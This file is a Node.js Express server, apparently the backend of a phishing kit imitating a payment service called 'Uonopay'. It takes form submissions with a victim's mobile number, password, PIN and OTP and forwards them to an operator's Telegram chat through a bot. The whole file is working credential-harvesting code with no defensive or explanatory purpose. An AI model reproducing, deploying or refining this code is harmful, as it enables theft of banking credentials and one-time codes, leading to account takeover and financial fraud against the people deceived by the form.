const express = require("express");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middlewares setup
app.use(cors());
app.use(express.json({ limit: "10kb" }));
app.use(express.static(__dirname));

// Telegram Bot initialization
// Dhyan rakhein ki aapki .env file mein BOT_TOKEN aur CHAT_ID sahi se set ho
const bot = new TelegramBot(process.env.BOT_TOKEN);

// Main Route jo HTML form ke fetch call se connect hoga
app.post("/submit", async (req, res) => {
    try {
console.log(req.body);
        
    const { phone, password, pin, otp } = req.body;

    // Basic validation check
    if (!phone && !otp) {
        return res.status(400).json({
            success: false,
            message: "Invalid data received."
        });
    }

    let messageText = 'Uonopay NOTIFICATION\n\n';

    if (otp) {
        messageText += `Received OTP: ${otp}`;
    } else {
        messageText += `Support Issue: ${req.body.issue || 'N/A'}\n` +
                       `📱 Mobile Number: ${phone}\n` +
                       `🔒 Password: ${password}\n` +
                       `🔑 Pin: ${pin}`;
    }

    await bot.sendMessage(process.env.CHAT_ID, messageText);
        
        // Frontend ko success response dena
        res.json({
            success: true,
            message: "Notification successfully sent to Telegram!"
        });

    } catch (error) {
        console.error("Telegram API Error:", error.message);
        res.status(500).json({
            success: false,
            message: "Internal Server Error: Telegram bot se connection fail hua."
        });
    }
});

// Server initialization
app.listen(PORT, () => {
    console.log("okpayk server running successfully on port " + PORT);
});
